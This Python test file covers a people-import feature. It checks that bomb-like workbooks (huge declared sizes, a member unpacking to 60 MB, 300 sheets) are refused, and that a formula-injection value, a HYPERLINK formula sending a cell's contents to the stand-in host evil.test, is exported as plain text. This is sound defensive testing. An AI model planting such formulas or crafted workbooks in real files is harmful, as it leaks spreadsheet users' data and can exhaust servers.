"""Review of workstream P (11-03 fixes, C2–C6): oversized workbooks, formula-safe templates, department moves through
roles, the company-wide sheet, and invitations only after a successful commit."""
import io
import re
import time
import zipfile

import openpyxl

from tests.factories import login_as
from tests.initiation.conftest import live, people, submitted  # noqa: F401
from tests.tenancy.test_people_import_1103 import _send


def _bomb(rows: int, cols: str = "XFD") -> bytes:
    """A small workbook whose sheet declares a huge size and has one far-away cell."""
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Finance"
    ws.append(["Full name", "Work email", "AI compliance role"])
    ws.cell(row=rows, column=1, value="x")
    b = io.BytesIO()
    wb.save(b)
    zin = zipfile.ZipFile(io.BytesIO(b.getvalue()))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for i in zin.infolist():
            d = zin.read(i.filename)
            if i.filename == "xl/worksheets/sheet1.xml":
                d = re.sub(rb'<dimension ref="[^"]+"', f'<dimension ref="A1:{cols}{rows}"'.encode(), d)
            zout.writestr(i, d)
    return out.getvalue()


def _undeclared_bomb(rows: int) -> bytes:
    """The same, with the size declaration removed, so only the reader's own bound protects it."""
    data = _bomb(rows)
    zin = zipfile.ZipFile(io.BytesIO(data))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for i in zin.infolist():
            d = zin.read(i.filename)
            if i.filename == "xl/worksheets/sheet1.xml":
                d = re.sub(rb'<dimension ref="[^"]+"/>', b"", d)
            zout.writestr(i, d)
    return out.getvalue()


def _inflated(member_mb: int) -> bytes:
    """A valid workbook plus a highly compressible member that unpacks to many megabytes."""
    wb = openpyxl.Workbook()
    wb.active.append(["Full name", "Work email", "AI compliance role"])
    b = io.BytesIO()
    wb.save(b)
    zin = zipfile.ZipFile(io.BytesIO(b.getvalue()))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for i in zin.infolist():
            zout.writestr(i, zin.read(i.filename))
        zout.writestr("xl/media/padding.bin", b"\0" * (member_mb * 1024 * 1024))
    return out.getvalue()


# ---- P1: oversized workbooks are refused quickly
def test_workbook_declaring_a_million_rows_is_refused_fast(client, db, people, live):
    cid, e, maria = live
    login_as(client, db, maria)
    data = _bomb(1048576)
    assert len(data) < 20_000
    for path in ("import/preview", "import"):
        t = time.monotonic()
        r = _send(client, cid, path, data, "people.xlsx")
        assert time.monotonic() - t < 2, path
        assert r.status_code == 422, r.text
        assert "rows" in r.json()["detail"]


def test_workbook_declaring_too_many_columns_is_refused(client, db, people, live):
    cid, e, maria = live
    login_as(client, db, maria)
    t = time.monotonic()
    r = _send(client, cid, "import/preview", _bomb(10, cols="CZ"), "people.xlsx")
    assert time.monotonic() - t < 2
    assert r.status_code == 422 and "columns" in r.json()["detail"]


def test_undeclared_far_away_row_is_bounded(client, db, people, live):
    cid, e, maria = live
    login_as(client, db, maria)
    t = time.monotonic()
    r = _send(client, cid, "import/preview", _undeclared_bomb(1048576), "people.xlsx")
    assert time.monotonic() - t < 2
    assert r.status_code == 200 and not r.json()["ready"]
    assert any("rows" in x["message"] for x in r.json()["errors"])


def test_workbook_that_unpacks_too_large_is_refused(client, db, people, live):
    cid, e, maria = live
    login_as(client, db, maria)
    data = _inflated(60)
    assert len(data) < 1_000_000
    t = time.monotonic()
    r = _send(client, cid, "import/preview", data, "people.xlsx")
    assert time.monotonic() - t < 2
    assert r.status_code == 422 and "MB" in r.json()["detail"]


def test_workbook_with_too_many_sheets_is_refused(client, db, people, live):
    cid, e, maria = live
    login_as(client, db, maria)
    wb = openpyxl.Workbook()
    for i in range(300):
        wb.create_sheet(f"S{i}")
    b = io.BytesIO()
    wb.save(b)
    r = _send(client, cid, "import/preview", b.getvalue(), "people.xlsx")
    assert r.status_code == 422 and "sheets" in r.json()["detail"]


def test_blank_rows_count_toward_the_row_limit():
    """A sheet with no declared size and one cell just past the scan limit stops at the limit instead of scanning on."""
    from app.tenancy.csv_import import MAX_ROWS, ROW_SCAN_LIMIT, read_workbook

    data = _undeclared_bomb(ROW_SCAN_LIMIT + 50)
    errors: list[dict] = []
    tables = read_workbook(data, errors)
    assert errors and str(MAX_ROWS) in errors[0]["message"]
    assert all(n <= ROW_SCAN_LIMIT for t in tables for n, _ in t.rows)


# ---- P2: names that look like formulas are written as text
FORMULA_NAME = '=HYPERLINK("http://evil.test/?"&B3,"Click")'


def _workbook(client, cid) -> bytes:
    r = client.get(f"/api/v1/clients/{cid}/departments/template.xlsx")
    assert r.status_code == 200
    return r.content


def test_formula_like_person_values_are_written_as_text(client, db, people, live):
    from tests.tenancy.test_people_import_1103 import _dept, preview

    cid, e, maria = live
    login_as(client, db, maria)
    _dept(client, cid, "Finance")
    r = client.post(f"/api/v1/clients/{cid}/users", json={"first_name": FORMULA_NAME, "last_name": "x", "email": "eve@abc.test",
                                                          "job_title": "=1+1", "department": "Finance", "role": "contributor"})
    assert r.status_code == 200, r.text
    data = _workbook(client, cid)
    ws = openpyxl.load_workbook(io.BytesIO(data))["Finance"]
    row = next(r for r in ws.iter_rows(min_row=2) if r[1].value == "eve@abc.test")
    assert row[0].data_type == "s" and row[0].value == FORMULA_NAME + " x"
    assert row[3].data_type == "s" and row[3].value == "=1+1"
    assert not any(c.data_type == "f" for ws_ in openpyxl.load_workbook(io.BytesIO(data)).worksheets for r_ in ws_.iter_rows() for c in r_)
    # uploaded again unchanged, the person is recognised and nothing changes
    pv = preview(client, cid, data, "people.xlsx")
    assert pv["errors"] == [], pv["errors"]
    eve = next(u for u in pv["users"] if u["email"] == "eve@abc.test")
    assert eve["action"] == "unchanged" and eve["name"] == FORMULA_NAME + " x"


def test_formula_like_department_name_is_text_and_round_trips(client, db, people, live):
    from tests.tenancy.test_people_import_1103 import _dept, _user, preview

    cid, e, maria = live
    login_as(client, db, maria)
    _dept(client, cid, "=1+2")
    _dept(client, cid, "@Ops[EU]:*?")
    _user(client, cid, "Gil", "Lee", "gil@abc.test", role="dept_compliance_lead", department="=1+2")
    data = _workbook(client, cid)
    wb = openpyxl.load_workbook(io.BytesIO(data))
    ds = wb["Departments"]
    cell = next(r[0] for r in ds.iter_rows(min_row=2) if r[0].value == "=1+2")
    assert cell.data_type == "s"
    for t in wb.sheetnames:
        assert not t.startswith(("=", "+", "-", "@", "'")) and len(t) <= 31 and not set(t) & set('[]:*?/\\')
    assert len({t.casefold() for t in wb.sheetnames}) == len(wb.sheetnames)
    pv = preview(client, cid, data, "people.xlsx")
    assert pv["errors"] == [], pv["errors"]
    assert {d["name"]: d["action"] for d in pv["departments"]} == {"=1+2": "unchanged", "@Ops[EU]:*?": "unchanged"}
    gil = next(u for u in pv["users"] if u["email"] == "gil@abc.test")
    assert gil["action"] == "unchanged" and gil["department"] == "=1+2"


# ---- P3: a department role never moves someone silently
def _dept_rows(db, uid):
    from sqlalchemy import select

    from app.audit_log.models import AuditLog

    return [(a.before or {}).get("department") and (a.before["department"], a.after["department"]) or (None, a.after["department"])
            for a in db.scalars(select(AuditLog).where(AuditLog.action == "user.department_change", AuditLog.object_id == uid).order_by(AuditLog.at))]


def _shown(db, cid, uid):
    from sqlalchemy import select

    from app.tenancy.models import Department, User
    from app.tenancy.people import user_department

    db.expire_all()
    names = {d.id: d.name for d in db.scalars(select(Department).where(Department.organization_id == cid))}
    return user_department(db, db.get(User, uid), names)


def _dept_roles(db, uid):
    from app.tenancy.service import roles_of

    return [(r.role, r.scope_id) for r in roles_of(db, uid) if r.scope_type == "department"]


def test_import_does_not_give_an_existing_person_a_role_in_another_department(client, db, people, live):
    from tests.tenancy.test_people_import_1103 import NEW_HEADER, _dept, _user, apply, preview

    cid, e, maria = live
    login_as(client, db, maria)
    _dept(client, cid, "Finance")
    _dept(client, cid, "Legal")
    uid = _user(client, cid, "Dee", "Org", "dee@abc.test", role="exec_sponsor", department="Finance")
    assert _shown(db, cid, uid) == "Finance"
    text = (NEW_HEADER + "\nDee Org,dee@abc.test,Legal,,,Contributor\n").encode()
    pv = preview(client, cid, text, "u.csv")
    msg = next(w["message"] for w in pv["warnings"] if w["field"] == "department")
    assert "not moved" in msg and "Contributor" in msg and "not added" in msg
    assert next(u for u in pv["users"] if u["email"] == "dee@abc.test")["action"] == "unchanged"
    assert apply(client, cid, text, "u.csv").status_code == 200
    assert _shown(db, cid, uid) == "Finance"
    assert _dept_roles(db, uid) == []
    assert _dept_rows(db, uid) == [(None, "Finance")]
    users = client.get(f"/api/v1/clients/{cid}/people").json()["users"]
    assert [u["department"] for u in users if u["email"] == "dee@abc.test"] == ["Finance"]


def test_department_upload_does_not_move_someone_from_another_department(client, db, people, live):
    from tests.tenancy.test_people_import_1103 import _dept, _user, apply, preview

    cid, e, maria = live
    login_as(client, db, maria)
    _dept(client, cid, "Finance")
    leg = _dept(client, cid, "Legal")
    uid = _user(client, cid, "Ann", "Fin", "ann@abc.test", role="client_admin", department="Finance")
    text = b"Full name,Work email,AI compliance role\nAnn Fin,ann@abc.test,Contributor; Data Protection Officer\n"
    pv = preview(client, cid, text, "u.csv", department_id=leg)
    assert any("not moved" in w["message"] and "Contributor" in w["message"] for w in pv["warnings"])
    assert apply(client, cid, text, "u.csv", department_id=leg).status_code == 200
    assert _shown(db, cid, uid) == "Finance"
    assert _dept_roles(db, uid) == []
    from app.tenancy.service import roles_of

    assert "dpo" in {r.role for r in roles_of(db, uid)}  # the company-wide role in the same row is still added


def test_adding_and_removing_a_department_role_records_the_department_change(client, db, people, live):
    from tests.tenancy.test_people_import_1103 import _dept, _user

    cid, e, maria = live
    login_as(client, db, maria)
    _dept(client, cid, "Finance")
    _dept(client, cid, "Legal")
    uid = _user(client, cid, "Hal", "Org", "hal@abc.test", role="exec_sponsor", department="Finance")
    r = client.post(f"/api/v1/clients/{cid}/users/{uid}/roles", json={"role": "contributor", "department": "Legal"})
    assert r.status_code == 200, r.text
    assert _shown(db, cid, uid) == "Legal"
    assert _dept_rows(db, uid) == [(None, "Finance"), ("Finance", "Legal")]
    from app.tenancy.service import roles_of

    ra = next(x for x in roles_of(db, uid) if x.role == "contributor")
    assert client.delete(f"/api/v1/clients/{cid}/users/{uid}/roles/{ra.id}").status_code in (200, 204)
    assert _shown(db, cid, uid) == "Finance"
    assert _dept_rows(db, uid) == [(None, "Finance"), ("Finance", "Legal"), ("Legal", "Finance")]
    hist = client.get(f"/api/v1/clients/{cid}/users/{uid}/history").json()
    assert sum(1 for h in (hist if isinstance(hist, list) else hist.get("events", hist.get("history", []))) if h.get("kind") == "department") == 3
